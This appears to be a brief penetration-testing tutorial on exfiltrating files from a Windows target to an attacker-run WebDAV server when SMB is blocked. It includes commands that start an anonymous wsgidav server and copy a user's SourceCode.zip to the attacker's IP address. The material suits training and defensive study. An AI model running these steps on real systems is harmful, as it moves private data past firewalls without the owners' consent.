In many networks, **SMB (port 445)** is blocked for security.  
When that happens, **WebDAV** (an HTTP/HTTPS-based file-sharing method) is the perfect workaround.

## 1. Why WebDAV?

- WebDAV = **Web Distributed Authoring and Versioning**
    
- Works over **HTTP/HTTPS**, so it often bypasses firewalls.
    
- Compatible with Windows' built-in **Mini-Redirector driver** — no extra tools needed.

## 2. Set Up a WebDAV Server (Attacker Machine)

### Step 1: Install WebDAV Python Tools

```bash
sudo pip3 install wsgidav cheroot
```

---

### Step 2: Start the WebDAV Server

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**Explanation:**

- `--host=0.0.0.0` → Listen on all interfaces
    
- `--port=80` → Serve on HTTP port 80
    
- `--root=/tmp` → Share `/tmp` directory
    
- `--auth=anonymous` → Allow access without credentials

## 3. Access the Share from Windows (Target Machine)

List the contents of the shared directory:

```cmd
dir \\192.168.49.128\DavWWWRoot
```

**Note:**  
`DavWWWRoot` is a special Windows keyword for the WebDAV root.

Or browse directly to a specific folder:

```cmd
dir \\192.168.49.128\sharefolder
```

---

## 4. Upload a File from Windows (Target Machine)

Upload a file into the root of the WebDAV share:

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\
```

Or upload into a specific subfolder:

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```
